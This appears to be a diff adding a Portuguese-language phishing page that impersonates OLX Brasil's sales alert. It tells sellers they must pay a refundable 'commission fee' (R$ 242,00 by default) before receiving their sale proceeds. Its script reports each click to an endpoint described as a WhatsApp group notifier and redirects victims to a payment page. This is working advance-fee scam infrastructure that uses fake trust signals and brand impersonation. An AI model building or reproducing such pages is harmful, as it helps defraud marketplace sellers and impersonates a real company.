@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Alerta de Venda - OLX">
+    <title>Alerta de Venda - OLX Brasil</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/alerta.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+     <script>
+        (function () {
+            if (document.cookie.indexOf("pagamentoFeito=true") !== -1) {
+                if (!window.location.pathname.endsWith('/pag/aprovado.html')) {
+                    window.location.href = '/pag/aprovado.html';
+                }
+            }
+        })();
+    </script>
+    
+    <style>
+        .alerta-container {
+            max-width: 800px;
+            margin: 30px auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+
+        .alerta-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .alerta-title {
+            color: #6e0ad6;
+            font-size: 24px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .alerta-title i {
+            margin-right: 10px;
+            font-size: 28px;
+            color: #ff9800;
+        }
+
+        .alerta-content {
+            line-height: 1.6;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        .alerta-content p {
+            margin-bottom: 15px;
+        }
+
+        .alerta-badge {
+            background-color: #f8f9fa;
+            border-left: 4px solid #6e0ad6;
+            padding: 15px;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+
+        .taxa-box {
+            background-color: #f1f8ff;
+            border: 1px solid #cce5ff;
+            border-radius: 5px;
+            padding: 15px;
+            text-align: center;
+            margin: 25px 0;
+        }
+
+        .taxa-valor {
+            font-size: 24px;
+            color: #6e0ad6;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        .btn-taxa {
+            background-color: #6e0ad6;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-weight: bold;
+            display: block;
+            margin: 20px auto;
+            max-width: 250px;
+        }
+
+        .btn-taxa:hover {
+            background-color: #5a08b0;
+        }
+
+        .info-seguranca {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .info-seguranca i {
+            margin-right: 8px;
+            color: #6e0ad6;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container">
+        <header class="header">
+            <div class="header-content">
+                <div class="logo">
+                    <img src="/images/olx-logo.png" alt="Logo OLX">
+                </div>
+
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="breadcrumb">
+                <a href="/">OLX</a> &gt; <a href="/vendas">Minhas Vendas</a> &gt; <span>Alerta</span>
+            </div>
+
+            <div class="alerta-container">
+                <div class="alerta-header">
+                    <h1 class="alerta-title">
+                        <i class="fas fa-bullhorn"></i> Atenção! Sua venda foi realizada!
+                    </h1>
+                </div>
+
+                <div class="alerta-content">
+                    <p>Parabéns pela venda! No entanto, você ainda não atingiu a pontuação necessária como vendedor em
+                        nossa plataforma. Para garantir a segurança, implementamos uma política para prevenir fraudes e
+                        garantir que somente vendedores confiáveis possam concluir transações.</p>
+
+                    <div class="alerta-badge">
+                        <p><i class="fas fa-lock"></i> <strong>Taxa de Comissão para Garantia</strong></p>
+                        <p>Por questão de segurança e para garantir que você realmente deseja vender seu produto, será
+                            cobrada uma taxa de comissão. Esta taxa ajuda a validar o processo e evitar fraudes. Não se
+                            preocupe, esse valor será devolvido junto com o valor da sua venda!</p>
+                    </div>
+
+                    <div class="taxa-box">
+                        <p>Taxa de Recebimentos de Valores:</p>
+                        <div class="taxa-valor" id="taxa-valor">Carregando...</div>
+                        <p>Este valor será reembolsado junto com o pagamento da sua venda</p>
+                    </div>
+
+                    <button class="btn-taxa" id="btnTaxa">Taxa de Recebimentos de Valores</button>
+
+                    <div class="info-seguranca">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Transação segura e protegida pela OLX Garantia</span>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="footer-bottom">
+                <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
+                <p>CNPJ: 13.673.743/0002-55 - Avenida Paulista, 1000 - São Paulo/SP</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Variável global para armazenar o preço
+        let precoConfig = "242,00"; // Valor padrão caso falhe o carregamento
+        
+        // Função para carregar o preço do config.json
+        function carregarPreco() {
+            return fetch('/config.json')  // Caminho relativo à raiz do site
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Não foi possível carregar o arquivo config.json');
+                    }
+                    return response.json();
+                })
+                .then(config => {
+                    if (config && config.preco) {
+                        // Formatar o preço para o padrão brasileiro (com vírgula)
+                        precoConfig = config.preco.replace('.', ',');
+                        
+                        // Atualizar o valor na interface
+                        document.getElementById('taxa-valor').textContent = `R$ ${precoConfig}`;
+                        console.log('Preço carregado com sucesso:', precoConfig);
+                        return precoConfig;
+                    } else {
+                        throw new Error('Formato do config.json inválido');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro ao carregar o preço:', error);
+                    document.getElementById('taxa-valor').textContent = `R$ ${precoConfig}`;
+                    return precoConfig; // Retornar o valor padrão em caso de erro
+                });
+        }
+        
+        document.addEventListener('DOMContentLoaded', function () {
+            // Definir valor padrão enquanto carrega
+            document.getElementById('taxa-valor').textContent = `R$ ${precoConfig}`;
+            
+            // Carregar o preço do config.json
+            carregarPreco();
+            
+            // Obter ID da URL se necessário
+            const urlParams = new URLSearchParams(window.location.search);
+            const idParam = urlParams.get('id') || 'KFTKWNQVMD';
+
+            // Capturar clique no botão de taxa
+            document.getElementById('btnTaxa').addEventListener('click', function (e) {
+                e.preventDefault();
+
+                // Mostrar feedback visual (opcional)
+                this.disabled = true;
+                const textoOriginal = this.textContent;
+                this.textContent = "Processando...";
+
+                // Obter informações da venda - usando o ID do parâmetro da URL
+                fetch(`/api/venda/${idParam}`)
+                    .then(response => response.json())
+                    .then(venda => {
+                        // Enviar notificação para o grupo WhatsApp
+                        return fetch('/api/notificar-clique-continuar', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                codigo: idParam,
+                                produto: venda.titulo || 'Produto não identificado',
+                                acao: 'clique_taxa',
+                                valor: precoConfig || '0,00' // Usar o preço carregado do config
+                            })
+                        });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Notificação enviada:", data);
+                        // Redirecionar para página de pagamento, mesmo se a notificação falhar
+                        window.location.href = `/pag/pagamento.html?id=${idParam}`;
+                    })
+                    .catch(error => {
+                        console.error('Erro:', error);
+                        // Redirecionar mesmo em caso de erro
+                        window.location.href = `/pag/pagamento.html?id=${idParam}`;
+                    });
+            });
+
+            // Atualizar links com o ID (código existente)
+            if (idParam) {
+                console.log("ID da venda:", idParam);
+                document.querySelectorAll('a[href*="pagamento.html"]').forEach(link => {
+                    link.href = `/pag/pagamento.html?id=${idParam}`;
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
